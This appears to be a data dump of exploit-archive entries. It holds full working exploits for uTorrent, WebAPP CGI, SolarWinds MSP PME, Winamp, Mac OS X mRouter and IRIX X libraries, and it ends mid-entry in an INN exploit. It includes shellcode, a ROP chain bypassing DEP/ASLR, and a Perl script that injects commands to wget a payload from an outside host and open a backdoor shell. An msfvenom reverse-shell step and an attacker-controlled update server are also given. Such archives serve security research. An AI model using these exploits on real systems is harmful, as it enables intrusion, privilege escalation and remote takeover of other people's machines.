//msvcrt.dll pop,pop,ret addr all xp sp1 exchange it with 0x7801D07B for win2k sp3/sp4 unsigned char jmptosc[] = ""\xeb\x04\ \xa7\x2c\xc2\x77\ \x33\xc0\xb0\x11\xc1\xe0\x08\x5b\x5b\x5b\x2b\xd8\xff\xe3"";  int main(int argc,char *argv[]) { 	FILE * pFile; 	long lSize; 	char * buffer; 	size_t result;  	long i = 0; 	long j = 0; 	long lPtrIndex; 	long lHeadSize; 	long lTailSize; 	char * curptr; 	char * alptr; 	char * torrentTail; 	 	if (argc < 2) 	{ 		printf(""\n[uTorrent 1.6] Heap Overflow Exploit - by [DEFACEDSECURITY]""); 		printf(""\n\nUsage: ""); 		printf(""%s"",argv[0]); 		printf("" <TorrentFile>\n""); 		return 0; 	} 	 	pFile = fopen (argv[1],""rb""); 	if (pFile==NULL)  	{ 		fputs (""File error"",stderr);  		return 0; 	}  	// obtain file size: 	fseek (pFile ,0,SEEK_END); 	lSize = ftell (pFile); 	rewind (pFile);  	// allocate memory to contain the whole file: 	buffer = (char*) malloc (sizeof(char)*lSize); 	if (buffer == NULL)  	{ 		fputs (""Memory error"",stderr);  		return 0; 	}  	// copy the file into the buffer: 	result = fread (buffer,1,lSize,pFile); 	if (result != lSize)  	{ 		fputs (""Reading error"",stderr);  		return 0; 	}  	fclose (pFile);  	/* find announce / announce-list and erase it */ 	alptr = (char *) strstr(buffer,""announce""); 	if (alptr == NULL) 	{ 		printf(""\ninvalid torrent file""); 		return 0; 	}  	curptr = (char *) strstr(alptr, ""7:comment""); 	lHeadSize = curptr - buffer ; 	lTailSize = lSize - lHeadSize;  	torrentTail = (char *) malloc (sizeof(char)*lTailSize); 	memcpy(torrentTail,curptr,lTailSize);  	/* generate offending header */ 	strcpy(nice_announce,""d8:announce4864:""); 	for (lPtrIndex = 16; lPtrIndex <= 4864+16; lPtrIndex++) 		nice_announce[lPtrIndex] = 0x90; 	lPtrIndex = 84; 	memcpy(nice_announce + lPtrIndex ,xorops,sizeof(xorops)-1); 	lPtrIndex += sizeof(xorops) -1; 	memcpy(nice_announce+lPtrIndex,shellcode, sizeof(shellcode)-1); 	for (lPtrIndex = 4438; lPtrIndex<4458; lPtrIndex++,i++) 		nice_announce[lPtrIndex] = jmptosc[i];  	/* get head and tail together into a file */ 	curptr = (char *) malloc(sizeof(char)*(NASIZE+lTailSize)); 	for (i=0;i<NASIZE;i++) 		curptr[i] = nice_announce[i]; 	for (;i<(NASIZE+lTailSize);i++,j++) 		curptr[i] = torrentTail[j];  	/* write to file and exit */ 	pFile = fopen ( ""output.torrent"" , ""wb"" ); 	if (pFile==NULL)  	{ 		fputs (""File error"",stderr);  		return 0; 	} 	fwrite(curptr, sizeof(char), (NASIZE+lTailSize), pFile); 	fclose (pFile);  	return 1337; //:) }  // milw0rm.com [2007-02-12]",μTorrent (uTorrent),1
1005,"WebAPP 0.9.9.2.1 - Remote Command Execution (1) !/usr/bin/perl ################################################################# #                         T r a p - S e t   U n d e r G r o u n D   H a c k i n g   T e a m                               # ################################################################# # Remote C0mmand Executing Expl0it - For WebAPP CGI # #Exploit By :  A l p h a _ P r o g r a m m e r ( Sirus-v ); #E-Mail : Alpha_Programmer@Yahoo.com #            Trapset_Sec@Yahoo.Ca #This xpl Open a Backdoor in 4444 Port with Nobody Access !!! All Of The *NIX OS that Have UnPatch #apage.cgi is Vulnerable in this M0ment !! # ################################################################# #  Gr33tz To ==>  AlphaST.Com , Crouz.Com  , Simorgh-ev.Com  And  MH_P0rtal , Oil_Krachack     # ################################################################# use IO::Socket;  if (@ARGV < 2) {  print ""\n==============================================\n"";  print "" \n    WebAPP CGI Exploit By Alpha_Programmer \n\n"";  print ""      Trap-Set Underground Hacking Team      \n\n"";  print ""            Usage: <T4rg3t> <Dir>      \n\n"";  print ""==============================================\n\n"";  print ""Examples:\n\n"";  print ""    WebApp.pl www.Host.com /cgi-bin/ \n"";  exit(); }   $serv = $ARGV[0]; $serv =~ s/http:\/\///ge;  $dir = $ARGV[1];  $cmde = ""cd /tmp;wget http://www.khatotarh.com/NeT/alpha.txt"";  $cmde =~ s/ /""\$IFS""/ge;  $req  = ""GET http://$serv""; $req .= ""$dir""; $req .= ""apage.cgi?f=file.htm.|echo\$IFS\""_N_\"";$cmde;echo\$IFS\""_T_\""| HTTP/1.0\n\n"";  $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", PeerPort=>80) or die "" (-) - C4n't C0nn3ct To The S3rver\n"";  print $sock $req; print ""\nPlease Wait ...\n\n""; sleep(3000); close($sock);  $sock2 = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", PeerPort=>80) or die "" (-) - C4n't C0nn3ct To The S3rver\n"";   $cmde2 = ""cd /tmp;cp alpha.txt alpha.pl;chmod 777 sirus.pl;perl sirus.pl"";  $cmde2 =~ s/ /""\$IFS""/ge;  $req2  = ""GET http://$serv""; $req2 .= ""$dir""; $req2 .= ""apage.cgi?f=file.htm.|echo\$IFS\""_N_\"";$cmde2;echo\$IFS\""_T_\""| HTTP/1.0\n\n"";  print $sock2 $req2; print ""\n\n$$$   OK -- Now Try: Nc -v www.host.com 4444   $$$\n""; print ""$$  if This Port was Close , This mean is That , You Hav'nt Permission to Write in /TMP  $$\n"";  ### EOF ###   # milw0rm.com [2005-05-20]",WebAPP,1
48448,"SolarWinds MSP PME Cache Service 1.1.14 - Insecure File Permissions # Title: SolarWinds MSP PME Cache Service 1.1.14 - Insecure File Permissions # Author: Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG # Date: 2020-05-06 # Vendor: https://www.solarwindsmsp.com/ # CVE: CVE-2020-12608 # GitHub: https://github.com/jensregel/Advisories/tree/master/CVE-2020-12608 # CVSSv3: 8.2 [CVSS:3.0/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H] # CWE: 276  Vulnerable version ================== SolarWinds MSP PME (Patch Management Engine) before 1.1.15  Timeline ======== 2020-04-24 Vulnerability discovered 2020-04-27 Send details to SolarWinds PSIRT 2020-04-27 SolarWinds confirmed the vulnerability 2020-05-05 SolarWinds released PME version 1.1.15 2020-05-06 Public disclosure  Description =========== An error with insecure file permissions has occurred in the SolarWinds MSP Cache Service, which is part of the Advanced Monitoring Agent and can lead to code execution. The SolarWinds MSP Cache Service is typically used to get new update definition files and versions for ThirdPartyPatch.exe or SolarWinds MSP Patch Management Engine Setup. The XML file CacheService.xml in %PROGRAMDATA%\SolarWinds MSP\SolarWinds.MSP.CacheService\config\ is writable by normal users, so that the parameter SISServerURL can be changed, which controls the location of the updates. After some analysis, we were able to provide modified XML files (PMESetup_details.xml and ThirdPartyPatch_details.xml) that point to an executable file with a reverse TCP payload using our controlled SISServerURL web server for SolarWinds MSP Cache Service.  Proof of Concept (PoC) ====================== As we can see, NTFS change permissions are set to CacheService.xml by default. Any user on the system who is in group users can change the file content. This is especially a big problem on terminal servers or multi-user systems.  PS C:\ProgramData\SolarWinds MSP\SolarWinds.MSP.CacheService\config> icacls .\CacheService.xml .\CacheService.xml VORDEFINIERT\Benutzer:(I)(M) NT-AUTORITÄT\SYSTEM:(I)(F) VORDEFINIERT\Administratoren:(I)(F)  1. Modify CacheService.xml  In the xml file, the parameter SISServerURL was adjusted, which now points to a web server controlled by the attacker.  <?xml version=""1.0"" encoding=""utf-8""?> <Configuration> <CachingEnabled>True</CachingEnabled> <ApplianceVersion>1.1.14.2223</ApplianceVersion> <CacheLocation>C:\ProgramData\SolarWinds MSP\SolarWinds.MSP.CacheService\cache</CacheLocation> <CacheSizeInMB>10240</CacheSizeInMB> <SISServerURL>https://evil-attacker.example.org</SISServerURL> <LogLevel>5</LogLevel> <Proxy></Proxy> <ProxyEncrypt>AQAAANCMnd8BFdER(...)</ProxyEncrypt> <ProxyCacheService /> <CacheFilesDeleted></CacheFilesDeleted> <CacheDeletedInBytes></CacheDeletedInBytes> <HostApplication>RMM</HostApplication> <CanBypassProxyCacheService>True</CanBypassProxyCacheService> <BypassProxyCacheServiceTimeoutSeconds>1</BypassProxyCacheServiceTimeoutSeconds> <ComponentUpdateMinutes>300</ComponentUpdateMinutes> <ComponentUpdateDelaySeconds>1</ComponentUpdateDelaySeconds> </Configuration>  2. Payload creation  Generate an executable file, for example using msfvenom, that establishes a reverse tcp connection to the attacker and store it on the web server.  msfvenom -p windows/x64/shell_reverse_tcp lhost=x.x.x.x lport=4444 -f exe > /tmp/solarwinds-shell.exe  3. Prepare web server  Place the modified xml files (PMESetup_details.xml or ThirdPartyPatch_details.xml) on the web server in the path /ComponentData/RMM/1/, calculate MD5, SHA1 and SHA256 checksums of the executable, set correct values for SizeInBytes and increase the version.  Example of PMESetup_details.xml  <ComponentDetails> <Name>Patch Management Engine</Name> <Description>Patch Management Engine</Description> <MD5Checksum>7a4a78b105a1d750bc5dfe1151fb70e1</MD5Checksum> <SHA1Checksum>3d9ed6bd44b5cf70a3fed8f511d9bc9273a1feac</SHA1Checksum> <SHA256Checksum> 80579df2533d54fe9cbc87aed80884f6a97e1ccdd0443ce2bcb815ef59ed3d65 </SHA256Checksum> <SizeInBytes>7168</SizeInBytes> <DownloadURL>/ComponentData/RMM/1/solarwinds-shell.exe</DownloadURL> <FileName>solarwinds-shell.exe</FileName> <Architecture>x86,x64</Architecture> <Locale>all</Locale> <Version>1.1.14.2224</Version> </ComponentDetails>  Example of ThirdPartyPatch_details.xml  <ComponentDetails xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema""> <Name>Third Party Patch</Name> <Description> Third Party Patch application for Patch Management Engine RMM v 1 and later </Description> <MD5Checksum>7a4a78b105a1d750bc5dfe1151fb70e1</MD5Checksum> <SHA1Checksum>3d9ed6bd44b5cf70a3fed8f511d9bc9273a1feac</SHA1Checksum> <SHA256Checksum> 80579df2533d54fe9cbc87aed80884f6a97e1ccdd0443ce2bcb815ef59ed3d65 </SHA256Checksum> <SizeInBytes>7168</SizeInBytes> <DownloadURL>/ComponentData/RMM/1/solarwinds-shell.exe</DownloadURL> <FileName>solarwinds-shell.exe</FileName> <Architecture>x86,x64</Architecture> <Locale>all</Locale> <Version>1.2.1.95</Version> </ComponentDetails>  4. Malicious executable download  After restarting the system or reloading the CacheService.xml, the service connects to the web server controlled by the attacker and downloads the executable file. This is then stored in the path %PROGRAMDATA%\SolarWinds MSP\SolarWinds.MSP.CacheService\cache\ and %PROGRAMDATA%\SolarWinds MSP\PME\archives\.  [24/Apr/2020:10:57:01 +0200] ""HEAD /ComponentData/RMM/1/solarwinds-shell.exe HTTP/1.1"" 200 5307 ""-"" ""-"" [24/Apr/2020:10:57:01 +0200] ""GET /ComponentData/RMM/1/solarwinds-shell.exe HTTP/1.1"" 200 7585 ""-"" ""-""  5. Getting shell  After a certain time the executable file is executed by SolarWinds MSP RPC Server service and establishes a connection with the rights of the system user to the attacker.  [~]: nc -nlvp 4444 Listening on [0.0.0.0] (family 0, port 4444) Connection from [x.x.x.x] port 4444 [tcp/*] accepted (family 2, sport 49980) Microsoft Windows [Version 10.0.18363.778] (c) 2019 Microsoft Corporation. Alle Rechte vorbehalten.  C:\WINDOWS\system32>whoami whoami nt-authority\system  C:\WINDOWS\system32>  Fix === There is a new PME version 1.1.15 which comes with auto-update https://success.solarwindsmsp.com/forum-post/X0D51T00007TMk6jSAD/",SolarWinds MSP PME Cache Service,1
14068,"Winamp 5.572 (Windows 7) - Local Buffer Overflow (ASLR + DEP Bypass) #!/usr/bin/python  #Exploit Title: 	Winamp v5.572 Local BoF Exploit (Win7 ASLR and DEP Bypass) #Date: 			June 26, 2010 #Author:		Node #Software Link:		http://download.nullsoft.com/winamp/client/winamp5572_full_emusic-7plus_en-us.exe #Tested on: 		Windows 7 Ultimate x64 ENG #Badchars: 		'\x00\xff\x5c\x2f\x0a\x0d\x20' #Instructions: Replace generated whatsnew.txt with original in Winamp folder, Start Winamp, rightclick the flash symbol, ""Nullsoft Winamp..."", Version history   print ""[+] Winamp_5.572_whatsnew.txt Win7 ASLR and DEP Bypass - by Node""  version = ""Winamp 5.572""  rop = ""A"" * 540          # Offset rop += ""\x8a\x35\x84\x07"" #0x0784358A :  # PUSH ESP # POP ESI # RETN       [Module : in_wm.dll] rop += ""A""*16 rop += ""\x8a\x3d\x14\x07"" #0x07143D8A :  # PUSH ESI # SUB AL,5E # XOR EAX,EAX # POP EBP # RETN     [Module: zlib.dll] rop += ""\xf7\xb8\x40\x07"" #0x0740B8F7 :  # XCHG EAX,EBP # RETN     [Module : gen_ff.dll] rop += ""\xd6\x5e\x65\x07"" #0x07655ED6 :  # ADD ESP,30 # RETN       [Module : in_cdda.dll] rop += ""0000"" #VirtualProtect placeholder rop += ""DDDD"" #return address placeholder rop += ""1111"" #lpAddress placeholder rop += ""2222"" #dwsize placeholder rop += ""3333"" #flNewProtect placeholder rop += ""\x60\xf6\x78\x07"" # lpflOldProtect (0x0778f660 writable address in in_mp3.dll)  rop += ""A""*24 #---------------Grab a kernel32 pointer from the stack-------------------- rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\x3a\xd8\x8d\x07""*4 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll] rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] rop += ""\x3a\xd8\x8d\x07""*3 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll] rop += ""\x29\x13\x09\x07""*29 #0x07091329 :  # INC EAX # RETN  [Module : libsndfile.dll] rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] rop += ""\xb3\x6a\x6c\x07"" #0x076C6AB3 :  # SUB EAX,EDX # RETN      [Module : in_flv.dll] rop += ""\xa7\x41\x11\x07"" #0x071141A7 :  # MOV EAX,DWORD PTR DS:[EAX] # RETN       [Module : tataki.dll] #----------------------EAX=kernel32, ESI=start----------------------  #---------------Change kernel32 pointer to VirtualProtect()----------------- rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\x3a\xd8\x8d\x07""*4 #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll] 104 rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 208 rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 410 rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 820 rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 1040 rop += ""\x67\x40\x5b\x07"" #0x075B4067 :  # MOV ECX,EAX # MOV EAX,ECX # RETN        [Module : gen_ml.dll] rop += ""\x65\x72\x0a\x07"" #0x070A7265 :  # ADD EAX,ECX # RETN      [Module : libsndfile.dll] 2080 rop += ""\x08\x13\x8d\x07"" #0x078D1308 :  # SUB EAX,41 # RETN       [Module : ml_disc.dll] 203f rop += ""\xc6\xd7\x8d\x07"" #0x078DD7C6 :  # SUB EAX,20 # RETN       [Module : ml_disc.dll] 201f rop += ""\xec\x11\x09\x07""*4 #0x070911EC :  # DEC EAX # RETN  [Module : libsndfile.dll] 201b rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] rop += ""\x10\x7d\x0b\x07"" #0x070B7D10 :  # ADD EAX,EDX # RETN      [Module : libsndfile.dll] #---------------EAX=VirtualProtect(), ESI=start-----------------  #-------------Write VirtualProtect() to stack---------------------- rop += ""\x82\x55\x40\x07""*12 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll] rop += ""\x43\x5d\x6f\x07"" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll] #---------------EAX=VirtualProtect(),ESI=start+12(VP)-----------   #-------------Write return address---------------------- rop += ""\xdd\xb7\x3e\x07"" #0x073EB7DD :  # MOV EAX,ESI # RETN      [Module : gen_ff.dll] rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x10\x7d\x0b\x07"" #0x070B7D10 :  # ADD EAX,EDX # RETN      [Module : libsndfile.dll] rop += ""\x82\x55\x40\x07""*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll] rop += ""\x43\x5d\x6f\x07"" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll] #------------EAX=start+12+312(shellcode),EDX=start+12(VP),ESI=start+16------------  #-------------Write placeholder 1---------------------- rop += ""\x82\x55\x40\x07""*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll] rop += ""\x43\x5d\x6f\x07"" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll] #------------EAX=start+12+312(shellcode),EDX=start+12(VP),ESI=start+20------------  #-------------Write placeholder 2---------------------- rop += ""\x89\xb3\x34\x08"" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s] rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x45\x35\x10\x08"" #0x08103545 :  # ADD EAX,104 # POP EBP # RETN    [Module : freetype.wac] rop +=""AAAA"" rop += ""\x82\x55\x40\x07""*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll] rop += ""\x43\x5d\x6f\x07"" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll] #---------EAX = 0x30c(size 780),EBX = shellcode, ESI=start+24(placeholder 2), EDX=start+12(VP)--------------  #-------------Write placeholder 3---------------------- rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\x3a\xd8\x8d\x07"" #0x078DD83A :  # ADD EAX,41 # RETN       [Module : ml_disc.dll] rop += ""\xec\x11\x09\x07"" #0x070911EC :  # DEC EAX # RETN  [Module : libsndfile.dll] rop += ""\x82\x55\x40\x07""*4 #0x07405582 :  # INC ESI # RETN  [Module : gen_ff.dll] rop += ""\x43\x5d\x6f\x07"" #0x076F5D43 :  # MOV DWORD PTR DS:[ESI],EAX # RETN       [Module : in_midi.dll] rop += ""\x74\x6c\x96\x07"" #0x07966C74 :  # XCHG EAX,EDX # RETN     [Module : ml_local.dll] #--------EAX=start+12(VP), EBX=start+12+312(shellcode), ESI=start+28-----------   #----------fix EBP problem after call return---------------- rop += ""\x89\xb3\x34\x08"" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s] rop += ""\x1a\x10\x09\x07"" #0x0709101A :  # XOR EAX,EAX # RETN      [Module : libsndfile.dll] rop += ""\xf7\xb8\x40\x07"" #0x0740B8F7 :  # XCHG EAX,EBP # RETN     [Module : gen_ff.dll] rop += ""\x89\xb3\x34\x08"" #0x0834B389 :  # XCHG EAX,EBX # RETN     [Module : jnetlib.w5s] rop += ""\x85\xe0\x09\x07"" #0x0709E085 :  # ADD EBP,EAX # RETN      [Module : libsndfile.dll] #---------EAX=vp, EBX=?, EDX=40, ESI=start+28, EBP=vp--------  #----------------go to VirtualProtect()------------------- rop += ""\xc1\xbb\x3c\x07"" #0x073CBBC1 :  # XCHG EAX,ESP # RETN     [Module : gen_ff.dll] #------------------------bang!-----------------------------  nops = ""\x90""*304  # msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\xff\x5c\x2f\x0a\x0d\x20' -t perl shellcode = (""\xbb\xd2\xaa\xfa\x33\x31\xc9\xb1\x33\xdb\xd3\xd9\x74\x24"" + ""\xf4\x5e\x83\xc6\x04\x31\x5e\x0b\x03\x5e\xd9\x48\x0f\xcf"" + ""\x35\x05\xf0\x30\xc5\x76\x78\xd5\xf4\xa4\x1e\x9d\xa4\x78"" + ""\x54\xf3\x44\xf2\x38\xe0\xdf\x76\x95\x07\x68\x3c\xc3\x26"" + ""\x69\xf0\xcb\xe5\xa9\x92\xb7\xf7\xfd\x74\x89\x37\xf0\x75"" + ""\xce\x2a\xfa\x24\x87\x21\xa8\xd8\xac\x74\x70\xd8\x62\xf3"" + ""\xc8\xa2\x07\xc4\xbc\x18\x09\x15\x6c\x16\x41\x8d\x07\x70"" + ""\x72\xac\xc4\x62\x4e\xe7\x61\x50\x24\xf6\xa3\xa8\xc5\xc8"" + ""\x8b\x67\xf8\xe4\x06\x79\x3c\xc2\xf8\x0c\x36\x30\x85\x16"" + ""\x8d\x4a\x51\x92\x10\xec\x12\x04\xf1\x0c\xf7\xd3\x72\x02"" + ""\xbc\x90\xdd\x07\x43\x74\x56\x33\xc8\x7b\xb9\xb5\x8a\x5f"" + ""\x1d\x9d\x49\xc1\x04\x7b\x3c\xfe\x57\x23\xe1\x5a\x13\xc6"" + ""\xf6\xdd\x7e\x8d\x09\x6f\x05\xe8\x09\x6f\x06\x5b\x61\x5e"" + ""\x8d\x34\xf6\x5f\x44\x71\x08\x2a\xc5\xd0\x80\xf3\x9f\x60"" + ""\xcd\x03\x4a\xa6\xeb\x87\x7f\x57\x08\x97\xf5\x52\x55\x1f"" + ""\xe5\x2e\xc6\xca\x09\x9c\xe7\xde\x69\x43\x7b\x82\x43\xe6"" + ""\xfb\x21\x9c\xe2"");  trash = ""B"" * 600  expfile = open('whatsnew.txt','w') expfile.write(version + rop + nops + shellcode + trash) print ""[+] whatsnew.txt generated."" expfile.close()","Winamp...""",0
766,"Apple Mac OSX 10.3.7 - 'mRouter' Local Privilege Escalation /*   * fm-iSink.c   * overflow in mRouter, suid binary used by iSync, on OSX <= 10.3.7   *   * written by -( nemo @ felinemenace.org )-   *   *                    _,'|             _.-''``-...___..--';)   *                    /_ \'.      __..-' ,      ,--...--'''   *                   <\    .`--'''       `     /'   *                   `-';'               ;   ; ;   *              __...--''     ___...--_..'  .;.'   *          fL (,__....----'''       (,..--''   *   * http://pulltheplug.org and http://felinemenace.org.   *   * Bug discovered by Braden Thomas. Exploit by nemo.   *   * -( need a challenge...? )-   * -( http://www.pulltheplug.org )-   */  #include <sys/types.h> #include <string.h> #include <unistd.h>  #define VULNPROG  ""/System/Library/SyncServices/SymbianConduit.bundle/Contents/Resources/ mRouter"" #define MAXBUFSIZE 4096  char shellcode[] = // Shellcode by b-r00t, modified by nemo. ""\x7c\x63\x1a\x79\x40\x82\xff\xfd\x39\x40\x01\xc3\x38\x0a\xfe\xf4"" ""\x44\xff\xff\x02\x39\x40\x01\x23\x38\x0a\xfe\xf4\x44\xff\xff\x02"" ""\x60\x60\x60\x60\x7c\xa5\x2a\x79\x7c\x68\x02\xa6\x38\x63\x01\x60"" ""\x38\x63\xfe\xf4\x90\x61\xff\xf8\x90\xa1\xff\xfc\x38\x81\xff\xf8"" ""\x3b\xc0\x01\x47\x38\x1e\xfe\xf4\x44\xff\xff\x02\x7c\xa3\x2b\x78"" ""\x3b\xc0\x01\x0d\x38\x1e\xfe\xf4\x44\xff\xff\x02\x2f\x62\x69\x6e"" ""\x2f\x73\x68"";  char filler[MAXBUFSIZE];  int main(int ac, char **av) { unsigned int ret  = 0xbffffffa -  strlen(shellcode);          char *args[] = { VULNPROG, ""-v"", ""-a"", filler, NULL }; char *env[]  = { ""TERM=xterm"", shellcode, NULL };           memset(filler,(char)'A',sizeof(filler));          memcpy(filler+MAXBUFSIZE-5,&ret,4);  execve(*args, args,env);           return 0; }  // milw0rm.com [2005-01-22]",Apple Mac OSX,1
19684,"SCO Open Server 5.0.5 / IRIX 6.2 ibX11/X11 Toolkit/Athena Widget Library - Local Buffer Overflow // source: https://www.securityfocus.com/bid/884/info  SCO Openserver and SGI IRIX (6.2 confirmed, possibly others) are vulnerable to several buffer overflows in various shared libraries related to the X window system. This means that all programs which link to these libraries could be vulnerable to exploitation through buggy library calls. The vulnerable libraries are:  LibX11 LibXt LibXaw LibXmu  This vulnerability may be similar to serious X library overflows, in our database as Bugtraq ID 237 (published in August, 1997) and the Sun X problems archived in our database as Bugtraq ID 238 (published in May, 1999).   /*## copyright LAST STAGE OF DELIRIUM nov 1998 poland        *://lsd-pl.net/ #*/ /*## libxaw.so inputmethod                                                   #*/  #include <fcntl.h>  #define NOPNUM 500 #define ADRNUM 500 #define PCHNUM 500  char shellcode[]=     ""\x04\x10\xff\xff""    /* bltzal  $zero,<shellcode>    */     ""\x24\x02\x03\xf3""    /* li      $v0,1011             */     ""\x23\xff\x01\x14""    /* addi    $ra,$ra,276          */     ""\x23\xe4\xff\x08""    /* addi    $a0,$ra,-248         */     ""\x23\xe5\xff\x10""    /* addi    $a1,$ra,-240         */     ""\xaf\xe4\xff\x10""    /* sw      $a0,-240($ra)        */     ""\xaf\xe0\xff\x14""    /* sw      $zero,-236($ra)      */     ""\xa3\xe0\xff\x0f""    /* sb      $zero,-241($ra)      */     ""\x03\xff\xff\xcc""    /* syscall                      */     ""/bin/sh"" ;  char jump[]=     ""\x03\xa0\x10\x25""    /* move    $v0,$sp              */     ""\x03\xe0\x00\x08""    /* jr      $ra                  */ ;  char nop[]=""\x24\x0f\x12\x34"";  main(int argc,char **argv){     char buffer[10000],adr[4],pch[4],*b,*envp[2];     int i,fd;      printf(""copyright LAST STAGE OF DELIRIUM nov 1998 poland  //lsd-pl.net/\n"");     printf(""libxaw.so inputmethod for irix 6.2 IP:17,19,20,21,22\n\n"");      if(argc!=2){         printf(""usage: %s xserver:display\n"",argv[0]);         exit(-1);     }      *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+8300+1000+200+12976;     *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+8300+500+200+32732;      envp[0]=""XENVIRONMENT=resource"";     envp[1]=0;      strcpy(buffer,""*text*international:    true\n"");     strcat(buffer,""*shellext*inputMethod:  "");     b=buffer+strlen(buffer);     for(i=0;i<PCHNUM;i++) *b++=pch[i%4];     for(i=0;i<ADRNUM;i++) *b++=adr[i%4];     for(i=0;i<NOPNUM;i++) *b++=nop[i%4];     for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];     *b++='\n';      fd=open(""resource"",O_CREAT|O_WRONLY,0666);     write(fd,buffer,strlen(buffer));     close(fd);      execle(""/usr/bin/X11/xconsole"",""lsd"",""-display"",argv[1],0,envp); }",SCO Open Server,1
20777,"ISC INN 2.x - Command-Line Buffer Overflow (1) // source: https://www.securityfocus.com/bid/2620/info  The innfeed utility, part of ISC InterNetNews, has an exploitable buffer overflow in its command-line parser. Specifically, innfeed will overflow if an overly long -c option is passed to it.  A local attacker in the news group could use this overflow to execute arbitary code with an effective userid of news, which could constitute an elevation in privileges, and the ability to alter news-owned binaries that could be run by root.  Exploits are available against x86 Linux builds of innfeed.   /*   x-innfeed.c    Buffer overflow in innfeed being called from startinnfeed renders uid(news) gid(news), startinnfeed is suid root so I have to also check if I can manage to get root out of this ....    Enrique A. Sanchez Montellano   (@defcom.com ... Yes is only @defcom.com) */  #include <stdio.h> #include <unistd.h> #include <string.h> #include <stdlib.h>  #define OFFSET  0 #define ALIGN   0 #define BUFFER  470  // MANDRAKE, REDHAT, etc....  #ifdef REDHAT /* optimized shellcode ;) (got rid of 2 bytes from aleph1's) */ //static char shellcode[]= //""\xeb\x15\x5b\x89\x5b\x08\x31\xc0\x88\x43\x07\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x31\xd2\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh""; char shellcode[] = 